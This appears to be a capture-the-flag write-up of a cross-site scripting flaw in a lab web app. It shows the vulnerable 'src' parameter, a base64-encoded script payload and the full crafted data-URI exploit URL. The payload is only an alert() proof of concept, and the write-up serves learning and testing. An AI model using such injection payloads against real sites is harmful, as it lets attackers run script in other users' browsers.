# XSS (Cross-Site Scripting) Vulnerability

## Discovery Process

1. Notice an image on the main page that can be clicked
2. Click on the image and observe the URL redirect:
```
http://10.13.200.245/?page=media&src=nsa
```
3. Identified that the `src` parameter controls the image source

## Vulnerability Details

- **Issue**: The `src` parameter is not properly sanitized and allows arbitrary data URIs
- **Attack vector**: XSS using base64-encoded data URI

## Exploitation

1. Create a base64-encoded HTML payload with JavaScript using [Base64 Encode](https://www.base64encode.org/):
```javascript
// Original payload: <script>alert('test')</script>
// Base64 encoded: PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
```

2. Replace the `src` parameter with the data URI:
```
http://10.13.200.245/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
```

3. Navigate to the crafted URL
4. Successfully obtained the flag
